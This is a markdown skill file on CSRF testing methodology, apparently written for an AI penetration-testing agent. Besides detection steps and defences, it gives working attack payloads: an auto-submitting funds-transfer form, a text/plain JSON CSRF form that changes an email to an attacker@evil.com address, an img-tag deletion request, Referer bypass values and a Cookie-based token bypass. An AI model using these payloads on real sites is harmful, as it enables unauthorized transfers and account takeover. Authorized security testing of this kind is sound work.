---
name: csrf-testing
description: Professional skills and methodology for CSRF (Cross-Site Request Forgery) testing
version: 1.0.0
---

# CSRF (Cross-Site Request Forgery) Testing

## Overview

CSRF (Cross-Site Request Forgery) is an attack that abuses a user's already-authenticated session to perform unauthorized actions. This skill provides methods for detecting, exploiting, and defending against CSRF vulnerabilities.

## How the Vulnerability Works

- The attacker lures the user into visiting a malicious page
- The malicious page automatically sends a request to the target site
- The browser automatically includes the user's authentication information (Cookie, Session)
- The target site mistakes it for a legitimate action by the user

## Testing Methods

### 1. Identify Sensitive Operations

- Password change
- Email change
- Funds transfer
- Privilege change
- Data deletion
- Status update

### 2. Detect CSRF Tokens

**Check whether Token protection is present:**
```html
<!-- With Token protection -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- Without Token protection - CSRF risk exists -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Verify Token Validity

**Test whether the Token is predictable:**
- Is the Token based on a timestamp
- Is the Token based on the user ID
- Can the Token be reused
- Is the Token shared across multiple requests

### 4. Check Referer Validation

**Test whether the Referer check can be bypassed:**
```javascript
// Normal request
Referer: https://target.com/change-password

// Bypass tests
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (empty)
```

## Exploitation Techniques

### Basic CSRF Attack

**Auto-submitting HTML form:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Bypassing the Content-Type check:**
```html
<!-- Submit JSON using an HTML form -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET Request CSRF

**Attacking via a GET request:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass Techniques

### Token Bypass

**If the Token is in a Cookie:**
```javascript
// If the Token exists in both the Cookie and the form
// try submitting only the Token from the Cookie
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // No csrf_token parameter, relying on the Cookie
});
```

### SameSite Cookie Bypass

**Leveraging subdomains:**
- If SameSite=Lax, a GET request can still carry the Cookie
- Use a subdomain to carry out the attack

### Double-Submit Cookie

**Bypassing Token validation:**
```html
<!-- If the Token is in a Cookie and the validation logic is flawed -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // Read the Token from the Cookie
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Tool Usage

### Burp Suite

**Using the CSRF PoC generator:**
1. Intercept the target request
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test the generated PoC

### OWASP ZAP

```bash
# Use ZAP to perform a CSRF scan
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Verification and Reporting

### Verification Steps

1. Confirm the target operation has no CSRF Token protection
2. Craft a malicious request and verify it is executable
3. Assess the impact (data leakage, privilege escalation, financial loss, etc.)
4. Document a complete PoC
5. Use the `report_finding` tool to record the confirmed vulnerability on the platform (the platform's sole entry point for logging vulnerabilities); the fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Reporting Key Points

- Vulnerability location and affected operations
- Attack scenario and scope of impact
- Complete exploitation steps and PoC
- Remediation recommendations (CSRF Token, SameSite Cookie, Referer validation, etc.)

## Defensive Measures

### Recommended Solutions

1. **CSRF Token**
   - Each form includes a unique Token
   - Store the Token in the Session
   - Validate the Token's validity

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double-Submit Cookie**
   - The Token exists in both the Cookie and the form
   - Validate that the two match

4. **Referer Validation**
   - Validate that the Referer is same-origin
   - Pay attention to handling of an empty Referer

## Notes

- Only test in authorized test environments
- Avoid causing real impact to user accounts
- Document all test steps
- Consider behavioral differences across browsers
